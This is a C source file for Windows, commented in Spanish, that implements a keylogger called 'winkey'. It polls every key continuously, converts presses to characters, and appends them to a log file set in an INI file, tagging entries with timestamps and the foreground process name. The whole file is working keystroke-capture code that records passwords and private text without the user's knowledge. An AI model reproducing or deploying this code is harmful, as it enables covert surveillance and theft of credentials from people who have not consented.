#define _CRT_SECURE_NO_WARNINGS
#define _WIN32_WINNT 0x0A00  // Define Windows 10 or Windows 11

#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include <time.h>

#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Psapi.lib")

#define INI_FILE_NAME L"winkey.ini"
#define DEFAULT_LOG_FILE L"winkey.log"
#define ERROR_LOG_FILE L"winkeyerror.log"
#define MAX_PATH_LEN 260

wchar_t lastProcessName[MAX_PATH_LEN] = L"";
HWND lastForegroundWindow = NULL;

SHORT previousState[256] = {0};  // Para evitar múltiples registros de la misma tecla

// Función para registrar errores
void logError(const wchar_t* format, ...) {
    FILE* file = _wfopen(ERROR_LOG_FILE, L"a+");
    if (file == NULL) {
        return;
    }

    time_t now = time(NULL);
    struct tm* localTime = localtime(&now);
    fwprintf(file, L"[%04d-%02d-%02d %02d:%02d:%02d] ",
             localTime->tm_year + 1900,
             localTime->tm_mon + 1,
             localTime->tm_mday,
             localTime->tm_hour,
             localTime->tm_min,
             localTime->tm_sec);

    va_list args;
    va_start(args, format);
    vfwprintf(file, format, args);
    va_end(args);

    fclose(file);
}

int loadConfiguration(wchar_t* logPath, size_t max_size) {
    wchar_t iniFilePath[MAX_PATH_LEN];
    DWORD length = GetModuleFileNameW(NULL, iniFilePath, MAX_PATH_LEN);
    if (length == 0 || length == MAX_PATH_LEN) {
        logError(L"Error getting executable path. Error: %lu\n", GetLastError());
        return 0;
    }

    wchar_t* lastBackslash = wcsrchr(iniFilePath, L'\\');
    if (lastBackslash != NULL) {
        *(lastBackslash + 1) = L'\0';
        wcscat_s(iniFilePath, MAX_PATH_LEN, INI_FILE_NAME);
    } else {
        logError(L"Error formatting INI file path.\n");
        return 0;
    }

    FILE* iniFile = _wfopen(iniFilePath, L"r");
    if (iniFile == NULL) {
        logError(L"INI file does not exist or cannot be opened: %ls\n", iniFilePath);
        return 0;
    }
    fclose(iniFile);

    DWORD charsRead = GetPrivateProfileStringW(L"Settings", L"Path", NULL, logPath, (DWORD)max_size, iniFilePath);
    if (charsRead == 0) {
        logError(L"Error reading 'Path' from INI. Error: %lu\n", GetLastError());
        return 0;
    }
    return 1;
}

void logProcessName(FILE* file) {
    HWND foregroundWindow = GetForegroundWindow();
    if (foregroundWindow == NULL) {
        fwprintf(file, L"[Unknown Process]");
        return;
    }

    if (foregroundWindow != lastForegroundWindow) {
        lastForegroundWindow = foregroundWindow;

        DWORD processId;
        GetWindowThreadProcessId(foregroundWindow, &processId);

        HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
        if (processHandle == NULL) {
            processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
        }
        if (processHandle == NULL) {
            processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
        }

        wchar_t processName[MAX_PATH_LEN] = L"Unknown Process";
        if (processHandle != NULL) {
            if (GetModuleBaseNameW(processHandle, NULL, processName, MAX_PATH_LEN) == 0) {
                if (GetProcessImageFileNameW(processHandle, processName, MAX_PATH_LEN) == 0) {
                    wcscpy_s(processName, MAX_PATH_LEN, L"Unknown Process");
                }
            }
            CloseHandle(processHandle);
        }

        if (wcscmp(lastProcessName, processName) != 0) {
            wcscpy_s(lastProcessName, MAX_PATH_LEN, processName);

            time_t now = time(NULL);
            struct tm* localTime = localtime(&now);
            fwprintf(file, L"\n[%04d-%02d-%02d %02d:%02d:%02d] [%ls]\n",
                     localTime->tm_year + 1900,
                     localTime->tm_mon + 1,
                     localTime->tm_mday,
                     localTime->tm_hour,
                     localTime->tm_min,
                     localTime->tm_sec,
                     processName);
        }
    }
}

// Función para capturar el estado del teclado y convertirlo a un carácter imprimible
void logPrintableKey(int key, FILE* file) {
    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);  // Obtener el estado del teclado (Shift, Caps Lock, etc.)

    WCHAR buffer[16];
    int result = ToUnicodeEx(key, MapVirtualKey(key, MAPVK_VK_TO_VSC), keyboardState, buffer, 16, 0, GetKeyboardLayout(0));

    if (result > 0) {
        buffer[result] = L'\0';  // Asegura que sea un string null-terminated
        fwprintf(file, L"%ls", buffer);  // Escribir el carácter imprimible
    }
}

// Controla las pulsaciones de teclas, detectando el estado del teclado y evitando pérdidas
void logKeystrokes(const wchar_t* logPath) {
    FILE* file = _wfopen(logPath, L"a+");
    if (file == NULL) {
        logError(L"Error opening log file: %ls\n", logPath);
        return;
    }

    logProcessName(file);  // Registrar el nombre del proceso si cambió

    // Monitorear todas las teclas
    for (int key = 8; key <= 255; key++) {
        SHORT keyState = GetAsyncKeyState(key);
        if ((keyState & 0x8000) && previousState[key] == 0) {  // Si la tecla está presionada y no se ha registrado antes
            // Captura de teclas imprimibles y combinaciones (Shift + tecla)
            if ((key >= 0x30 && key <= 0x5A) || (key >= 0x60 && key <= 0x7A) || key == VK_SPACE || key == VK_OEM_1 || key == VK_OEM_PLUS || key == VK_OEM_COMMA || key == VK_OEM_MINUS || key == VK_OEM_PERIOD || key == VK_OEM_2 || key == VK_OEM_3 || key == VK_OEM_4 || key == VK_OEM_5 || key == VK_OEM_6 || key == VK_OEM_7) {
                logPrintableKey(key, file);  // Registrar teclas imprimibles y combinaciones
            }
            previousState[key] = 1;  // Marcar la tecla como registrada
        } else if (!(keyState & 0x8000)) {
            previousState[key] = 0;  // Restablecer el estado si la tecla se ha liberado
        }
    }

    fclose(file);
}

int wmain(void) {
    wchar_t logPath[MAX_PATH_LEN];
    if (!loadConfiguration(logPath, MAX_PATH_LEN)) {
        wcscpy_s(logPath, MAX_PATH_LEN, DEFAULT_LOG_FILE);
        logError(L"Could not load configuration. Using default log file: %ls\n", logPath);
    } else {
        logError(L"Log file: %ls\n", logPath);
    }

    while (1) {
        logKeystrokes(logPath);
        Sleep(1);  // Reducir el delay para minimizar la pérdida de teclas
    }

    return 0;
}
